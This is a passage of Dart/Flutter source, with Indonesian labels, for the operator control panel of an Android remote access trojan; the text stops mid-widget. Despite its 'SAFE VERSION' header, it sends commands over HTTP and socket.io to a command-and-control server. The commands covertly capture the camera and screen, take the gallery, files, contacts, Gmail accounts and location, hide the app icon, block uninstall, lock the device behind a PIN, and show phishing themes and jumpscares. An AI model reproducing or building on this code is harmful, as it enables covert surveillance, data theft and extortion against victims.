// ============================================================
// control_panel.dart — khusus KONTROL device (SAFE VERSION)
// ============================================================
import 'dart:async';
import 'dart:convert';
import 'dart:io';

import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:shared_preferences/shared_preferences.dart';
import 'package:socket_io_client/socket_io_client.dart' as IO;
import 'package:video_player/video_player.dart';
import 'package:webview_flutter/webview_flutter.dart';
import 'package:path_provider/path_provider.dart';

import '../server/domain_server.dart' show baseUrl;

// ==================== HAIMIYA MIO PALETTE ====================
class MioColors {
  static const Color ice = Color(0xFFEAF2FB);
  static const Color silver = Color(0xFFD6E4F5);
  static const Color lightBlue = Color(0xFFA9C7F0);
  static const Color blue = Color(0xFF5B8DEF);
  static const Color deepBlue = Color(0xFF1E3A8A);
  static const Color ink = Color(0xFF1B2A4A);
  static const Color softInk = Color(0xFF5A6B8C);
  static const Color white = Color(0xFFFFFFFF);
  static const Color green = Color(0xFF22C55E);
  static const Color red = Color(0xFFEF4444);
  static const Color yellow = Color(0xFFFACC15);
  static const Color pink = Color(0xFFEC4899);
  static const Color purple = Color(0xFF9333EA);
}

// ==================== THEME PRESET ====================
class ThemePreset {
  final Color bg;
  final Color card;
  final Color text;
  final Color subText;
  final Color accent;
  final Color accent2;
  final Color border;

  const ThemePreset({
    required this.bg,
    required this.card,
    required this.text,
    required this.subText,
    required this.accent,
    required this.accent2,
    required this.border,
  });
}

class AppTheme {
  static ThemePreset of(BuildContext context) {
    return const ThemePreset(
      bg: MioColors.ice,
      card: MioColors.white,
      text: MioColors.ink,
      subText: MioColors.softInk,
      accent: MioColors.deepBlue,
      accent2: MioColors.pink,
      border: MioColors.deepBlue,
    );
  }
}

// ===== ENUM =====
enum LogType { info, success, warning, error }

class LogEntry {
  final DateTime timestamp;
  final String message;
  final LogType type;
  LogEntry({
    required this.timestamp,
    required this.message,
    this.type = LogType.info,
  });
}

// ─── CONTROL PANEL PAGE ───────────────────────────────────────────────
class ControlPanelPage extends StatefulWidget {
  final Map<String, dynamic>? device;
  final String? username;
  final String? sessionKey;
  final String? role;

  const ControlPanelPage({
    super.key,
    this.device,
    this.username,
    this.sessionKey,
    this.role,
  });

  @override
  State<ControlPanelPage> createState() => _ControlPanelPageState();
}

class _ControlPanelPageState extends State<ControlPanelPage>
    with SingleTickerProviderStateMixin {
  // ─── STATE ───
  final List<LogEntry> _executionLogs = [];
  IO.Socket? socket;
  bool _isConnected = false;

  String _targetId = "unknown";
  String _targetModel = "COMMAND CENTER";
  Map<String, dynamic> _deviceData = {};

  String _userRole = 'user';
  String _username = 'PANXX';
  String? _sessionKey;

  // ─── ANIMASI ───
  late AnimationController _fadeController;
  late Animation<double> _fadeAnimation;

  // ─── CONTROLLERS ───
  final ScrollController _logScrollController = ScrollController();

  // ─── CONTROL ITEMS ───
  late List<Map<String, dynamic>> _controlItems;

  // ─── STATE KONTROL ───
  bool _isJumpscareActive = false;
  bool _isJumpscare2Active = false;
  bool _isVideoOverlayActive = false;
  bool _isLockCustomActive = false;
  bool _isAntiUninstallActive = false;
  String _lockCustomHtml = '';
  String _jumpscareUrl = '';
  String _jumpscare2Url = '';
  int _jumpscare2Duration = 3000;
  List<String> _blockedApps = [];
  List<Map<String, dynamic>> _installedApps = [];

  // ─── FOTO STATE ───
  bool _isWaitingForPhoto = false;
  BuildContext? _photoLoadingContext;
  String _lastCameraFrame = '';

  // ─── GALLERY STREAM ───
  final StreamController<List<Map<String, dynamic>>> _galleryStreamController =
      StreamController<List<Map<String, dynamic>>>.broadcast();

  // ─── VIDEO BACKGROUND ───
  VideoPlayerController? _bgVideoController;
  bool _bgVideoReady = false;

  @override
  void initState() {
    super.initState();

    _fadeController = AnimationController(
      duration: const Duration(milliseconds: 350),
      vsync: this,
    );
    _fadeAnimation = CurvedAnimation(
      parent: _fadeController,
      curve: Curves.easeInOut,
    );
    _fadeController.forward();

    // ===== Ambil device dari argumen (null-safe) =====
    _deviceData = widget.device ?? {};
    _targetId = (_deviceData['id'] ?? 'unknown').toString();
    _targetModel =
        (_deviceData['name'] ?? _deviceData['model'] ?? 'DEVICE').toString();

    _loadRoleAndToken();
    _initBgVideo();
    _initControlItems();
    _initSocket();
  }

  Future<void> _loadRoleAndToken() async {
    final prefs = await SharedPreferences.getInstance();
    _sessionKey = widget.sessionKey ?? prefs.getString("key");
    _userRole = (widget.role ?? prefs.getString("role") ?? 'user')
        .toLowerCase()
        .trim();
    _username = widget.username ?? prefs.getString("username") ?? 'PANXX';
    if (mounted) setState(() {});
  }

  void _initBgVideo() {
    try {
      _bgVideoController = VideoPlayerController.asset('assets/videos/rat.mp4')
        ..initialize().then((_) {
          if (!mounted) return;
          setState(() => _bgVideoReady = true);
          _bgVideoController?.setLooping(true);
          _bgVideoController?.setVolume(0.0);
          _bgVideoController?.play();
        }).catchError((e) {
          debugPrint('[BG VIDEO] error: $e');
          if (mounted) setState(() => _bgVideoReady = false);
        });
    } catch (e) {
      debugPrint('[BG VIDEO] init error: $e');
      _bgVideoReady = false;
    }
  }

  void _initControlItems() {
    _controlItems = [
      {
        "label": "Flash",
        "icon": Icons.flash_on,
        "colorKey": "yellow",
        "command": "flashlight",
        "isToggle": true,
        "isOn": _deviceData['flashlight'] ?? false,
        "needsInput": false,
      },
      {
        "label": "Lock Device",
        "icon": Icons.lock,
        "colorKey": "blue",
        "command": "lockDevice",
        "isToggle": true,
        "isOn": _deviceData['deviceLocked'] ?? false,
        "needsInput": true,
        "inputHint": "Pesan kunci (opsional)",
        "inputType": "text",
      },
      {
        "label": "Lock V2 (HTML)",
        "icon": Icons.lock_outline,
        "colorKey": "purple",
        "command": "lockCustom",
        "isToggle": true,
        "isOn": _isLockCustomActive,
        "needsInput": true,
        "inputHint": "HTML untuk tampilan kunci",
        "inputType": "multiline",
      },
      {
        "label": "Video Overlay",
        "icon": Icons.movie_creation,
        "colorKey": "pink",
        "command": "videoOverlay",
        "isToggle": true,
        "isOn": _isVideoOverlayActive,
        "needsInput": false,
      },
      {
        "label": "Hide Icon",
        "icon": Icons.visibility_off,
        "colorKey": "yellow",
        "command": "hideIcon",
        "isToggle": true,
        "isOn": _deviceData['iconHidden'] ?? false,
        "needsInput": false,
      },
      {
        "label": "Mute Volume",
        "icon": Icons.volume_off,
        "colorKey": "pink",
        "command": "muteVolume",
        "isToggle": true,
        "isOn": _deviceData['volumeMuted'] ?? false,
        "needsInput": false,
      },
      {
        "label": "Anti Uninstall",
        "icon": Icons.security,
        "colorKey": "green",
        "command": "antiUninstall",
        "isToggle": true,
        "isOn": _isAntiUninstallActive,
        "needsInput": false,
      },
      {
        "label": "Stuck Layar",
        "icon": Icons.touch_app,
        "colorKey": "yellow",
        "command": "touchBlock",
        "isToggle": false,
        "needsInput": true,
        "inputHint": "Durasi dalam detik (0 = ∞)",
        "inputType": "number",
        "extra": '{"duration": 0}',
      },
      {
        "label": "TTS",
        "icon": Icons.record_voice_over,
        "colorKey": "purple",
        "command": "ttsSpeak",
        "isToggle": false,
        "needsInput": true,
        "inputHint": "Teks untuk diucapkan",
        "inputType": "text",
        "extra": '{"text":"Halo, ini tes suara","lang":"id"}',
      },
      {
        "label": "Foto Depan",
        "icon": Icons.camera_front,
        "colorKey": "blue",
        "command": "camera",
        "isToggle": false,
        "needsInput": false,
        "extra": "front",
      },
      {
        "label": "Foto Belakang",
        "icon": Icons.camera_rear,
        "colorKey": "blue",
        "command": "camera",
        "isToggle": false,
        "needsInput": false,
        "extra": "back",
      },
      {
        "label": "Live Cam Depan",
        "icon": Icons.videocam,
        "colorKey": "blue",
        "command": "liveCamera",
        "isToggle": false,
        "needsInput": false,
        "extra": "front",
      },
      {
        "label": "Live Cam Belakang",
        "icon": Icons.videocam,
        "colorKey": "blue",
        "command": "liveCamera",
        "isToggle": false,
        "needsInput": false,
        "extra": "back",
      },
      {
        "label": "Stop Camera",
        "icon": Icons.stop_circle,
        "colorKey": "pink",
        "command": "stopCamera",
        "isToggle": false,
        "needsInput": false,
      },
      {
        "label": "Stop Live Screen",
        "icon": Icons.stop_screen_share,
        "colorKey": "pink",
        "command": "stopScreen",
        "isToggle": false,
        "needsInput": false,
      },
      {
        "label": "Vibrate",
        "icon": Icons.vibration,
        "colorKey": "darkGrey",
        "command": "vibrate",
        "isToggle": false,
        "needsInput": false,
        "extra": "500",
      },
      {
        "label": "Toast",
        "icon": Icons.message,
        "colorKey": "yellow",
        "command": "showToast",
        "isToggle": false,
        "needsInput": true,
        "inputHint": "Pesan toast",
        "inputType": "text",
        "extra": "Pesan dari C2!",
      },
      {
        "label": "Spam Dialog",
        "icon": Icons.chat,
        "colorKey": "pink",
        "command": "dialogSpam",
        "isToggle": false,
        "needsInput": true,
        "inputHint": "Teks spam",
        "inputType": "text",
        "extra": '{"text":"SPAM dari C2!"}',
      },
      {
        "label": "Block App",
        "icon": Icons.block,
        "colorKey": "pink",
        "command": "blockApp",
        "isToggle": false,
        "needsInput": false,
      },
      {
        "label": "Unblock App",
        "icon": Icons.check_circle,
        "colorKey": "green",
        "command": "unblockApp",
        "isToggle": false,
        "needsInput": true,
        "inputHint": "Package name (contoh: com.whatsapp)",
        "inputType": "text",
        "extra": "com.whatsapp",
      },
      {
        "label": "Unblock All",
        "icon": Icons.check_circle_outline,
        "colorKey": "green",
        "command": "unblockAll",
        "isToggle": false,
        "needsInput": false,
      },
      {
        "label": "Tema Phising",
        "icon": Icons.color_lens,
        "colorKey": "green",
        "command": "changeTheme",
        "isToggle": false,
        "needsInput": true,
        "inputHint": "Nama tema (whatsapp/instagram/etc)",
        "inputType": "text",
        "extra": "whatsapp",
      },
      {
        "label": "Get Location",
        "icon": Icons.location_on,
        "colorKey": "yellow",
        "command": "getLocation",
        "isToggle": false,
        "needsInput": false,
      },
      {
        "label": "Live Screen",
        "icon": Icons.screen_share,
        "colorKey": "blue",
        "command": "screen",
        "isToggle": false,
        "needsInput": false,
        "extra": "start",
      },
      {
        "label": "Phone",
        "icon": Icons.phone_android,
        "colorKey": "green",
        "command": "getPhone",
        "isToggle": false,
        "needsInput": false,
      },
      {
        "label": "Gmail",
        "icon": Icons.email_outlined,
        "colorKey": "pink",
        "command": "getGmail",
        "isToggle": false,
        "needsInput": false,
      },
      {
        "label": "Kontak",
        "icon": Icons.contacts_outlined,
        "colorKey": "yellow",
        "command": "getContacts",
        "isToggle": false,
        "needsInput": false,
      },
      {
        "label": "Jumpscare",
        "icon": Icons.warning_amber_rounded,
        "colorKey": "pink",
        "command": "jumpscareStart",
        "isToggle": true,
        "isOn": _isJumpscareActive,
        "needsInput": false,
      },
      {
        "label": "Jumpscare V2",
        "icon": Icons.dangerous,
        "colorKey": "pink",
        "command": "jumpscare2Start",
        "isToggle": true,
        "isOn": _isJumpscare2Active,
        "needsInput": false,
      },
      {
        "label": "Set Wallpaper",
        "icon": Icons.wallpaper,
        "colorKey": "purple",
        "command": "setWallpaper",
        "isToggle": false,
        "needsInput": true,
        "inputHint": "URL Gambar",
        "inputType": "text",
        "extra": "https://example.com/image.jpg",
      },
      {
        "label": "Open Situs",
        "icon": Icons.public,
        "colorKey": "green",
        "command": "openUrl",
        "isToggle": false,
        "needsInput": true,
        "inputHint": "URL Situs",
        "inputType": "text",
        "extra": "https://example.com",
      },
      {
        "label": "Galeri",
        "icon": Icons.photo_library,
        "colorKey": "blue",
        "command": "getGallery",
        "isToggle": false,
        "needsInput": false,
        "extra": "",
      },
      {
        "label": "File Manager",
        "icon": Icons.folder_open,
        "colorKey": "yellow",
        "command": "getFiles",
        "isToggle": false,
        "needsInput": false,
        "extra": "",
      },
    ];
  }

  Color _resolveItemColor(ThemePreset preset, String key) {
    switch (key) {
      case 'yellow':
        return preset.accent2;
      case 'pink':
        return preset.accent2;
      case 'blue':
        return preset.accent;
      case 'purple':
        return preset.accent;
      case 'green':
        return preset.accent;
      case 'darkGrey':
        return preset.subText;
      default:
        return preset.accent;
    }
  }

  // ─── SOCKET ───
  void _initSocket() {
    if (_sessionKey == null || _sessionKey!.isEmpty) return;
    try {
      socket = IO.io(
        baseUrl,
        IO.OptionBuilder()
            .setTransports(['websocket'])
            .setPath('/socket.io')
            .setQuery({
              'type': 'admin',
              'id': 'CONTROL_PANEL',
              'token': _sessionKey!,
              'role': _userRole,
            })
            .enableAutoConnect()
            .enableReconnection()
            .setReconnectionAttempts(999)
            .setReconnectionDelay(2000)
            .build(),
      );

      socket!.onConnect((_) {
        if (!mounted) return;
        setState(() => _isConnected = true);
        _addLog("✅ Terhubung", LogType.success);
        socket!.emit('controller:join', {
          'token': _sessionKey,
          'role': _userRole,
        });
        _setupSocketListeners();
      });

      socket!.onDisconnect((_) {
        if (mounted) setState(() => _isConnected = false);
      });

      socket!.connect();
    } catch (e) {
      debugPrint('[SOCKET] init error: $e');
    }
  }

  void _setupSocketListeners() {
    socket!.off('command_response');
    socket!.off('status:$_targetId');
    socket!.off('camera:screenshot');
    socket!.off('camera:frame');
    socket!.off('device:gallery');

    socket!.on('command_response', (data) {
      if (data is Map && data['deviceId'] == _targetId) {
        final cmd = data['command']?.toString() ?? '';
        final status = data['status']?.toString() ?? '';
        _addLog("📥 $cmd → $status", LogType.info);
        _handleCommandResponse(cmd, status, data);
      }
    });

    socket!.on('status:$_targetId', (data) {
      if (data is Map) {
        _applyStatusUpdate(Map<String, dynamic>.from(data));
      }
    });

    socket!.on('camera:screenshot', (data) {
      if (data is Map &&
          data['deviceId'] == _targetId &&
          data['frame'] != null) {
        _addLog("📸 Screenshot received", LogType.success);
        _lastCameraFrame = data['frame'].toString();
        if (_isWaitingForPhoto) {
          _isWaitingForPhoto = false;
          if (_photoLoadingContext != null) {
            try {
              Navigator.pop(_photoLoadingContext!);
            } catch (_) {}
            _photoLoadingContext = null;
          }
          if (mounted) {
            Navigator.push(
              context,
              MaterialPageRoute(
                builder: (_) => ScreenshotResultPage(
                  targetModel: _targetModel,
                  screenshotFrame: data['frame'].toString(),
                  screenshotFacing: (data['facing'] ?? 'front').toString(),
                  onClose: () => Navigator.pop(context),
                ),
                fullscreenDialog: true,
              ),
            );
          }
        }
      }
    });

    socket!.on('camera:frame', (data) {
      if (data is Map &&
          data['deviceId'] == _targetId &&
          data['frame'] != null) {
        _lastCameraFrame = data['frame'].toString();
      }
    });

    socket!.on('device:gallery', (data) {
      if (data is Map &&
          data['deviceId'] == _targetId &&
          data['photos'] != null &&
          data['photos'] is List) {
        final photos = (data['photos'] as List)
            .where((e) => e is Map)
            .map((e) => Map<String, dynamic>.from(e))
            .toList();
        _galleryStreamController.add(photos);
        _addLog("🖼️ Gallery received: ${photos.length} foto", LogType.success);
      }
    });
  }

  void _handleCommandResponse(String cmd, String status, Map data) {
    switch (cmd) {
      case 'jumpscareStart':
        setState(() => _isJumpscareActive = status == 'started');
        _updateControlItemState('jumpscareStart', status == 'started');
        break;
      case 'jumpscareStop':
        setState(() => _isJumpscareActive = false);
        _updateControlItemState('jumpscareStart', false);
        break;
      case 'jumpscare2Start':
        setState(() => _isJumpscare2Active = status == 'started');
        _updateControlItemState('jumpscare2Start', status == 'started');
        break;
      case 'jumpscare2Stop':
        setState(() => _isJumpscare2Active = false);
        _updateControlItemState('jumpscare2Start', false);
        break;
      case 'unlockDevice':
        setState(() {
          _isLockCustomActive = false;
          _updateControlItemState('lockCustom', false);
          _deviceData['deviceLocked'] = false;
          _updateControlItemState('lockDevice', false);
        });
        break;
      case 'lockDevice':
        final locked = status == 'locked' || status == 'true';
        setState(() {
          _deviceData['deviceLocked'] = locked;
          _updateControlItemState('lockDevice', locked);
        });
        break;
      case 'flashlight':
        setState(() {
          _deviceData['flashlight'] = status == 'on';
          _updateControlItemState('flashlight', status == 'on');
        });
        break;
      case 'hideIcon':
        setState(() {
          _deviceData['iconHidden'] = status == 'hidden';
          _updateControlItemState('hideIcon', status == 'hidden');
        });
        break;
      case 'muteVolume':
        setState(() {
          _deviceData['volumeMuted'] = status == 'muted';
          _updateControlItemState('muteVolume', status == 'muted');
        });
        break;
      case 'antiUninstall':
        setState(() {
          _isAntiUninstallActive = status == 'active';
          _updateControlItemState('antiUninstall', status == 'active');
        });
        break;
      case 'videoOverlay':
        setState(() => _isVideoOverlayActive = status == 'started');
        break;
    }
  }

  void _applyStatusUpdate(Map<String, dynamic> data) {
    setState(() {
      if (data['deviceLocked'] != null) {
        _deviceData['deviceLocked'] = data['deviceLocked'];
        _updateControlItemState('lockDevice', data['deviceLocked'] == true);
      }
      if (data['flashlight'] != null) {
        _deviceData['flashlight'] = data['flashlight'];
        _updateControlItemState('flashlight', data['flashlight'] == true);
      }
      if (data['iconHidden'] != null) {
        _deviceData['iconHidden'] = data['iconHidden'];
        _updateControlItemState('hideIcon', data['iconHidden'] == true);
      }
      if (data['volumeMuted'] != null) {
        _deviceData['volumeMuted'] = data['volumeMuted'];
        _updateControlItemState('muteVolume', data['volumeMuted'] == true);
      }
    });
  }

  void _updateControlItemState(String command, bool value) {
    for (int i = 0; i < _controlItems.length; i++) {
      if (_controlItems[i]['command'] == command) {
        setState(() {
          _controlItems[i]['isOn'] = value;
        });
        break;
      }
    }
  }

  void _addLog(String message, [LogType type = LogType.info]) {
    if (!mounted) return;
    setState(() {
      _executionLogs.insert(0,
          LogEntry(timestamp: DateTime.now(), message: message, type: type));
      if (_executionLogs.length > 200) _executionLogs.removeLast();
    });
  }

  String _formatTime(DateTime t) =>
      "${t.hour.toString().padLeft(2, '0')}:${t.minute.toString().padLeft(2, '0')}:${t.second.toString().padLeft(2, '0')}";

  Color _getLogColor(ThemePreset preset, LogType type) {
    switch (type) {
      case LogType.success:
        return preset.accent;
      case LogType.error:
        return preset.accent2;
      case LogType.warning:
        return preset.accent2;
      default:
        return preset.subText;
    }
  }

  // ─── SEND COMMAND ───
  Future<void> _sendCommand(String command, {String? extra}) async {
    if (_targetId == 'unknown' || _targetId.isEmpty) {
      _addLog("❌ Device ID tidak valid", LogType.error);
      return;
    }

    bool sent = false;
    if (_sessionKey != null) {
      try {
        final response = await http
            .post(
              Uri.parse("$baseUrl/api/command/$_targetId"),
              headers: {
                "Content-Type": "application/json",
                "x-auth-token": _sessionKey!,
              },
              body: jsonEncode({"command": command, "value": extra ?? ""}),
            )
            .timeout(const Duration(seconds: 8));

        if (response.statusCode == 200) {
          _addLog("🚀 $command", LogType.success);
          sent = true;
        } else if (response.statusCode == 401) {
          _addLog("❌ Sesi kadaluarsa", LogType.error);
          return;
        } else if (response.statusCode == 503) {
          _addLog("⚠️ Device offline, coba socket", LogType.warning);
        } else {
          _addLog("❌ ERR ${response.statusCode}", LogType.error);
        }
      } catch (e) {
        debugPrint('[HTTP CMD] error: $e');
      }
    }

    if (!sent && socket != null && socket!.connected) {
      try {
        socket!.emit('command', {
          'deviceId': _targetId,
          'command': command,
          'value': extra ?? '',
        });
        _addLog("🚀 (socket) $command", LogType.success);
      } catch (e) {
        debugPrint('[SOCKET CMD] error: $e');
      }
    }
  }

  // ─── DIALOGS ───
  Future<String?> _showLockDeviceDialog() async {
    String pin = '';
    String lockTitle = '';
    String errorMessage = '';
    final preset = AppTheme.of(context);

    return showDialog<String>(
      context: context,
      barrierDismissible: false,
      builder: (context) => StatefulBuilder(
        builder: (context, setState) => AlertDialog(
          backgroundColor: preset.card,
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(14),
            side: BorderSide(color: preset.border, width: 3),
          ),
          title: Text(
            'SET DEVICE LOCK',
            style: TextStyle(
              color: preset.text,
              fontSize: 18,
              fontWeight: FontWeight.w900,
              letterSpacing: 1.5,
            ),
            textAlign: TextAlign.center,
          ),
          content: SingleChildScrollView(
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                Text(
                  'MASUKKAN PIN & JUDUL LOCK',
                  style: TextStyle(
                    color: preset.subText,
                    fontSize: 10,
                    letterSpacing: 1.5,
                    fontWeight: FontWeight.w800,
                  ),
                ),
                const SizedBox(height: 18),
                Align(
                  alignment: Alignment.centerLeft,
                  child: Text(
                    'PIN 4 ANGKA',
                    style: TextStyle(
                      color: preset.text,
                      fontSize: 11,
                      fontWeight: FontWeight.w800,
                      letterSpacing: 1,
                    ),
                  ),
                ),
                const SizedBox(height: 8),
                Row(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: List.generate(4, (index) {
                    return Container(
                      width: 48,
                      height: 56,
                      margin: const EdgeInsets.symmetric(horizontal: 4),
                      decoration: BoxDecoration(
                        border: Border.all(color: preset.border, width: 2.5),
                        borderRadius: BorderRadius.circular(10),
                        color: preset.card,
                      ),
                      child: Center(
                        child: Text(
                          index < pin.length ? '●' : '—',
                          style: TextStyle(
                            color: preset.text,
                            fontSize: index < pin.length ? 20 : 22,
                            fontWeight: FontWeight.bold,
                          ),
                        ),
                      ),
                    );
                  }),
                ),
                const SizedBox(height: 12),
                TextField(
                  keyboardType: TextInputType.number,
                  onChanged: (value) {
                    setState(() {
                      pin = value;
                      errorMessage = '';
                    });
                  },
                  style: const TextStyle(color: Colors.transparent),
                  decoration: const InputDecoration(
                    isDense: true,
                    contentPadding: EdgeInsets.zero,
                    border: InputBorder.none,
                  ),
                  autofocus: true,
                ),
                GridView.count(
                  crossAxisCount: 3,
                  shrinkWrap: true,
                  physics: const NeverScrollableScrollPhysics(),
                  padding: EdgeInsets.zero,
                  mainAxisSpacing: 8,
                  crossAxisSpacing: 8,
                  children: [
                    ...[1, 2, 3, 4, 5, 6, 7, 8, 9].map((num) {
                      return _buildKeypadButton(
                        preset,
                        '$num',
                        onPressed: () {
                          if (pin.length < 4) {
                            setState(() {
                              pin += '$num';
                              errorMessage = '';
                            });
                          }
                        },
                      );
                    }),
                    _buildKeypadButton(
                      preset,
                      '⌫',
                      onPressed: () {
                        if (pin.isNotEmpty) {
                          setState(() {
                            pin = pin.substring(0, pin.length - 1);
                            errorMessage = '';
                          });
                        }
                      },
                    ),
                  ],
                ),
                if (errorMessage.isNotEmpty) ...[
                  const SizedBox(height: 8),
                  Text(
                    errorMessage,
                    style: TextStyle(
                      color: preset.accent2,
                      fontSize: 10,
                      fontWeight: FontWeight.w800,
                    ),
                  ),
                ],
                const SizedBox(height: 8),
                Align(
                  alignment: Alignment.centerLeft,
                  child: Text(
                    'JUDUL / PESAN LOCK',
                    style: TextStyle(
                      color: preset.text,
                      fontSize: 11,
                      fontWeight: FontWeight.w800,
                      letterSpacing: 1,
                    ),
                  ),
                ),
                const SizedBox(height: 8),
                TextField(
                  onChanged: (value) => setState(() => lockTitle = value),
                  maxLength: 60,
                  decoration: InputDecoration(
                    hintText: 'Contoh: Sistem Terkunci...',
                    hintStyle: TextStyle(color: preset.subText, fontSize: 12),
                    counterText: '',
                    contentPadding: const EdgeInsets.symmetric(
                        horizontal: 14, vertical: 12),
                    border: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(8),
                      borderSide: BorderSide(color: preset.border, width: 2),
                    ),
                  ),
                  style: TextStyle(color: preset.text, fontSize: 13),
                ),
              ],
            ),
          ),
          actions: [
            TextButton(
              onPressed: () => Navigator.pop(context, null),
              child: Text("BATAL",
                  style: TextStyle(
                      color: preset.subText, fontWeight: FontWeight.w800)),
            ),
            ElevatedButton(
              onPressed: () {
                if (pin.length != 4) {
                  setState(() => errorMessage = 'PIN harus 4 angka!');
                  return;
                }
                final lockData = jsonEncode({
                  'pin': pin,
                  'title': lockTitle.trim().isEmpty
                      ? 'Perangkat Terkunci'
                      : lockTitle.trim(),
                });
                Navigator.pop(context, lockData);
              },
              style: ElevatedButton.styleFrom(
                backgroundColor: preset.accent,
                foregroundColor: preset.card,
                shape: RoundedRectangleBorder(
                  borderRadius: BorderRadius.circular(8),
                  side: BorderSide(color: preset.border, width: 2),
                ),
              ),
              child: const Text("LOCK DEVICE",
                  style: TextStyle(fontWeight: FontWeight.w800)),
            ),
          ],
        ),
      ),
    );
  }

  Future<String?> _showInputDialog({
    required String title,
    required String hint,
    String initialValue = '',
    bool multiline = false,
    TextInputType keyboardType = TextInputType.text,
  }) async {
    final controller = TextEditingController(text: initialValue);
    final preset = AppTheme.of(context);

    return showDialog<String>(
      context: context,
      barrierDismissible: false,
      builder: (context) => AlertDialog(
        backgroundColor: preset.card,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(14),
          side: BorderSide(color: preset.border, width: 3),
        ),
        title: Text(title,
            style: TextStyle(
                color: preset.text,
                fontWeight: FontWeight.w900,
                fontSize: 16)),
        content: TextField(
          controller: controller,
          maxLines: multiline ? 10 : 1,
          keyboardType: keyboardType,
          decoration: InputDecoration(
            hintText: hint,
            hintStyle: TextStyle(color: preset.subText),
            border: OutlineInputBorder(
                borderRadius: BorderRadius.circular(8),
                borderSide: BorderSide(color: preset.border, width: 2)),
          ),
          style: TextStyle(color: preset.text),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context, null),
            child: Text("BATAL",
                style: TextStyle(
                    color: preset.subText, fontWeight: FontWeight.w800)),
          ),
          ElevatedButton(
            onPressed: () => Navigator.pop(context, controller.text.trim()),
            style: ElevatedButton.styleFrom(
              backgroundColor: preset.accent,
              foregroundColor: preset.card,
              shape: RoundedRectangleBorder(
                borderRadius: BorderRadius.circular(8),
                side: BorderSide(color: preset.border, width: 2),
              ),
            ),
            child: const Text("KIRIM",
                style: TextStyle(fontWeight: FontWeight.w800)),
          ),
        ],
      ),
    );
  }

  Widget _buildKeypadButton(
    ThemePreset preset,
    String label, {
    required VoidCallback onPressed,
  }) {
    return GestureDetector(
      onTap: onPressed,
      child: Container(
        decoration: BoxDecoration(
          border: Border.all(color: preset.border, width: 2),
          borderRadius: BorderRadius.circular(8),
          color: preset.bg,
        ),
        child: Material(
          color: Colors.transparent,
          child: InkWell(
            onTap: onPressed,
            child: Center(
              child: Text(
                label,
                style: TextStyle(
                  color: preset.text,
                  fontSize: 18,
                  fontWeight: FontWeight.w800,
                ),
              ),
            ),
          ),
        ),
      ),
    );
  }

  // ─── BUILD ───
  @override
  Widget build(BuildContext context) {
    final preset = AppTheme.of(context);

    return Scaffold(
      backgroundColor: preset.bg,
      body: SafeArea(
        top: false,
        child: Column(
          children: [
            _buildTopBar(preset),
            Expanded(
              child: FadeTransition(
                opacity: _fadeAnimation,
                child: _buildControlTab(preset),
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildTopBar(ThemePreset preset) {
    return Container(
      color: preset.card,
      padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 8),
      child: Row(
        children: [
          IconButton(
            icon: Icon(Icons.arrow_back_ios, color: preset.text, size: 20),
            onPressed: () => Navigator.pop(context),
          ),
          Expanded(
            child: Center(
              child: Container(
                padding:
                    const EdgeInsets.symmetric(horizontal: 14, vertical: 5),
                decoration: BoxDecoration(
                  color: preset.accent2,
                  border: Border.all(color: preset.border, width: 2),
                  borderRadius: BorderRadius.circular(8),
                ),
                child: Text(
                  _targetModel.toUpperCase(),
                  style: TextStyle(
                    color: preset.text,
                    fontWeight: FontWeight.w900,
                    fontSize: 13,
                    letterSpacing: 1.5,
                  ),
                  overflow: TextOverflow.ellipsis,
                ),
              ),
            ),
          ),
          IconButton(
            icon: Icon(Icons.refresh_rounded, color: preset.text, size: 22),
            onPressed: () {
              setState(() {});
            },
          ),
        ],
      ),
    );
  }

  Widget _buildSectionHeader(
      ThemePreset preset, String title, Color color) {
    return Row(
      children: [
        Container(
          padding: const EdgeInsets.all(6),
          decoration: BoxDecoration(
            color: color,
            borderRadius: BorderRadius.circular(6),
            border: Border.all(color: preset.border, width: 2),
          ),
          child: Icon(Icons.tune_rounded, color: preset.card, size: 14),
        ),
        const SizedBox(width: 8),
        Expanded(
          child: Text(
            title,
            style: TextStyle(
              color: preset.text,
              fontSize: 13,
              fontWeight: FontWeight.w900,
              letterSpacing: 1.5,
            ),
          ),
        ),
      ],
    );
  }

  // ==================== DEVICE INFO CARD (SAFE) ====================
  Widget _buildDeviceInfoCard(ThemePreset preset) {
    // Ambil status aman (bisa String atau Map)
    bool isOnline = false;
    try {
      final st = _deviceData['status'];
      if (st is String) {
        isOnline = st.toLowerCase() == 'online';
      } else if (st is Map) {
        isOnline = st['connected'] == true;
      }
      if (!isOnline && _deviceData['online'] == true) isOnline = true;
    } catch (_) {}

    final String model =
        (_deviceData['model'] ?? _targetModel).toString();
    final String deviceId = (_deviceData['id'] ?? 'unknown').toString();
    final String androidVersion =
        (_deviceData['androidVersion'] ?? '?').toString();
    final String batteryStr = (_deviceData['battery'] ?? 0).toString();

    return Container(
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(14),
        border: Border.all(color: preset.border, width: 3),
        boxShadow: [
          BoxShadow(
            color: preset.border.withOpacity(0.15),
            offset: const Offset(5, 5),
            blurRadius: 0,
          ),
        ],
      ),
      child: ClipRRect(
        borderRadius: BorderRadius.circular(11),
        child: Stack(
          children: [
            // Background: video kalau siap, else warna solid
            if (_bgVideoReady &&
                _bgVideoController != null &&
                _bgVideoController!.value.isInitialized)
              SizedBox(
                height: 210,
                width: double.infinity,
                child: FittedBox(
                  fit: BoxFit.cover,
                  child: SizedBox(
                    width: _bgVideoController!.value.size.width,
                    height: _bgVideoController!.value.size.height,
                    child: VideoPlayer(_bgVideoController!),
                  ),
                ),
              )
            else
              Container(height: 210, color: preset.accent),

            Container(height: 210, color: Colors.black.withOpacity(0.55)),

            Padding(
              padding: const EdgeInsets.all(16),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Row(
                    children: [
                      Container(
                        width: 10,
                        height: 10,
                        decoration: BoxDecoration(
                          color: isOnline ? preset.accent : preset.accent2,
                          shape: BoxShape.circle,
                          border: Border.all(color: Colors.white, width: 2),
                        ),
                      ),
                      const SizedBox(width: 8),
                      Text(
                        isOnline ? "ONLINE" : "OFFLINE",
